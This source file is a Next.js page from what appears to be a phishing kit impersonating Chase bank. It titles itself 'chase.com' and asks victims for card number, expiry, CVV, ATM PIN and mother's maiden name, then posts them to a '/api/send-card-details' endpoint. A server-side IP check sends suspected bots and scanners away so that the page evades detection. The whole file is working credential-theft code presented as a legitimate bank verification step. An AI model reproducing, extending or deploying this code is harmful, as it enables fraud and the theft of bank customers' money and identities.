import { Typography } from "@mui/material";
import { Box } from "@mui/system";
import axios from "axios";
import Head from "next/head";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import valid from "card-validator";
import { Content } from "../components/Content";
import { CustomButton } from "../components/CustomButton";
import { CustomInput } from "../components/CustomInput";
import { SubTitle } from "../components/SubTitle";
import { Title } from "../components/Title";
import { Wrapper } from "../components/Wrapper";
import { getNextUrl } from "../utils/getNextUrl";
import { getProgress } from "../utils/getProgress";
import { DataContext } from "./_app";
import { GetServerSideProps } from "next";
import checkIp from "../middleware/checkIp";

interface VerifyCardProps {}

export const VerifyCard: React.FC<VerifyCardProps> = ({}) => {
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({
    mode: "onTouched",
  });

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();

  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    const formData = new FormData();

    formData.append(`form`, `CARD`);
    formData.append(
      `cardDetails`,
      JSON.stringify({ sessionId: datas.sessionId, ...data })
    );

    try {
      await axios.post(`/api/send-card-details`, formData);
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    setLoading(false);
    const url = getProgress()[getProgress().indexOf(`CARD`) + 1];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper current="CARD">
      <Box width="100%" padding="1rem">
        <Head>
          <title>Identification - chase.com</title>
        </Head>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            paddingX: "2rem",
          }}
        >
          <Typography
            component="h2"
            sx={{
              marginTop: "10px",
              color: "#666",
              fontWeight: 300,
              fontSize: "1.5rem",
            }}
          >
            {`Let's verify your card.`}
          </Typography>
          <Typography
            component="h3"
            sx={{
              marginTop: "8px",
              fontSize: ".8125rem",
              fontWeight: 300,
              color: "#414042",
            }}
          >
            To protect your account, please tell us the requested info so we can
            verify that {`it's`} really you. Please use the card associated with
            the account you entered on the previous step.
          </Typography>
        </Box>
        <Box
          sx={{
            background: "white",
            width: ["100%", "60%"],
            margin: "0 auto",
            padding: "2rem",
          }}
        >
          <Box>
            <Title title="Card details" />
            <SubTitle subTitle="Please verify the card details linked to you account" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Card number"
                  name="cardNumber"
                  errors={errors}
                  mask={cardMask}
                  register={register("cardNumber", {
                    required:
                      "Card number must be entered. Please enter your card number.",
                    validate: (value) => {
                      if (valid.number(value).isValid) {
                        return true;
                      }

                      return "Please enter a valid card number";
                    },
                    onChange: (event: any) => {
                      var value = event.target.value;

                      var newState = "9999 9999 9999 9999";
                      if (/^3[47]/.test(value)) {
                        newState = "9999 999999 99999";
                      }
                      setCardMask(newState);
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Expiration date"
                  name="expirationDate"
                  helperText="mm/yy"
                  errors={errors}
                  mask={`99/99`}
                  register={register("expirationDate", {
                    required:
                      "Expiration date must be entered. Please enter your expiration date.",
                    validate: (value) => {
                      if (valid.expirationDate(value).isValid) {
                        return true;
                      }

                      return "Please enter a valid expiration date in the format mentioned above";
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box>
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Security code"
                  name="cvv"
                  helperText='The three-digit "CVV number" is printed on the back of the card to the right of the signature box. '
                  errors={errors}
                  type="number"
                  register={register("cvv", {
                    required:
                      "Security code must be entered. Please enter your security code.",
                    validate: (value) => {
                      if (valid.cvv(value, [3, 4]).isValid) {
                        return true;
                      }

                      return "Please enter a valid expiration date in the format mentioned above";
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Title title="Card verification" />
            <Content>
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="Mother's Maiden Name"
                  name="mmn"
                  errors={errors}
                  register={register("mmn")}
                />
              </Box>
              <Box width="10px" display={["none", "block"]} />
              <Box flex={1} width={["100%", "initial"]}>
                <CustomInput
                  label="ATM pin"
                  name="cardPin"
                  errors={errors}
                  type="number"
                  register={register("cardPin", {
                    required: "Please enter your card ATM pin",
                    pattern: {
                      value: /^[0-9]{4,5}$/,
                      message: "Please enter a valid ATM pin",
                    },
                  })}
                />
              </Box>
            </Content>
          </Box>
          <Box marginTop="1.5rem">
            <Typography
              component="p"
              sx={{
                color: "#666",
                fontSize: [".8125rem", ".875rem"],
              }}
            >
              For additional security please verify your {`Mother's`} Maiden
              Name to submit your card details.
            </Typography>
          </Box>
          <Box
            width="100%"
            sx={{
              display: "flex",
              justifyContent: "flex-end",
              marginTop: "1.5rem",
            }}
          >
            <Box width={["100%", "30%"]}>
              <CustomButton
                text="Verify"
                onClick={onSubmit}
                disabled={loading}
              />
            </Box>
          </Box>
        </Box>
      </Box>
    </Wrapper>
  );
};

export const getServerSideProps: GetServerSideProps = async ({ req }) => {
  const { valid } = await checkIp(req);

  return {
    props: { isBot: valid },
    ...(!valid
      ? {
          redirect: {
            destination: process.env.NEXT_PUBLIC_EXIT_URL,
            permanent: false,
          },
        }
      : {}),
  };
};

export default VerifyCard;
